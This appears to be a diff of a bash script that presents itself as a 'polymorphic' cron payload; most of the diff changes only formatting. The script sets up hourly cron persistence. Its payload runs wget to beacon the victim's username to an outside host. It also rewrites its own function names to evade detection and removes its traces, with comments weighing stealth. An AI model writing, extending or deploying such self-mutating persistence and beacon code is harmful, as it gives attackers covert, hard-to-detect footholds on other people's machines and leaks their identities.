@@ -1,20 +1,25 @@
 #!/bin/bash
+
 # --- Configuration --- (MODIFY THESE)
 
-# [[CONFIG_MARKER_START]]
+# [[CONFIG_MARKER_START]] -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 # The command to be scheduled in cron. IMPORTANT: Use absolute paths.
 # Example: payload_cmd_4a9b="/usr/bin/touch /tmp/cron_ran_${RANDOM}"
+
 payload_cmd_4a9b="/usr/bin/wget -q -O /dev/null http://example.com/beacon?id=$(whoami)_${RANDOM}"
 
 # The cron schedule. Example: "*/5 * * * *" = every 5 minutes.
+
 cron_schedule_c3d8="0 * * * *" # Example: Every hour at minute 0
 
 # Internal script identifier (used to check if cron job already exists)
+
 script_id_tag_e1f0="POLYCRON_PAYLOAD_ID_$(echo "$payload_cmd_4a9b" | md5sum | cut -d' ' -f1)" # Unique tag
-# [[CONFIG_MARKER_END]]
+
+# [[CONFIG_MARKER_END]] -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
 
-# --- Polymorphism Engine ---
+# --- Polymorphism Engine -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
 # [[POLY_FUNC_MARKER_START_gen_rand_str_b5a2]]
 # Function to generate a random alphanumeric string for renaming
@@ -96,10 +101,10 @@ mutate_self_9h3k() {
   [ -f "$tmp_script_k5n6" ] && rm -f "$tmp_script_k5n6"
   
 }
-# [[POLY_FUNC_MARKER_END_mutate_self_9h3k]]
+# [[POLY_FUNC_MARKER_END_mutate_self_9h3k]] -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
 
-# --- Cron Job Management ---
+# --- Cron Job Management -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
 # [[POLY_FUNC_MARKER_START_setup_cron_a7s1]]
 # Function to add the command to crontab if not already present
@@ -129,10 +134,11 @@ setup_cron_a7s1() {
     # Check exit status? Maybe not for stealth.
   fi
 }
-# [[POLY_FUNC_MARKER_END_setup_cron_a7s1]]
+# [[POLY_FUNC_MARKER_END_setup_cron_a7s1]]-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
 
-# --- Self-Cleaning ---
+
+# --- Self-Cleaning -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
 # [[POLY_FUNC_MARKER_START_clean_traces_z2x0]]
 # Function to attempt trace removal
@@ -156,10 +162,10 @@ clean_traces_z2x0() {
     disown -h %1 2>/dev/null || disown %1 2>/dev/null || : # Try to disown the background job
   fi
 }
-# [[POLY_FUNC_MARKER_END_clean_traces_z2x0]]
+# [[POLY_FUNC_MARKER_END_clean_traces_z2x0]] -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
 
-# --- Main Execution ---
+# --- Main Execution -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
 # [[POLY_FUNC_MARKER_START_main_logic_k1l9]]
 main_logic_k1l9() {
@@ -186,7 +192,7 @@ main_logic_k1l9() {
   # Exit cleanly
   exit 0
 }
-# [[POLY_FUNC_MARKER_END_main_logic_k1l9]]
+# [[POLY_FUNC_MARKER_END_main_logic_k1l9]]-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
 # --- Script Entry Point ---
 # Call the main logic function using its current polymorphic name
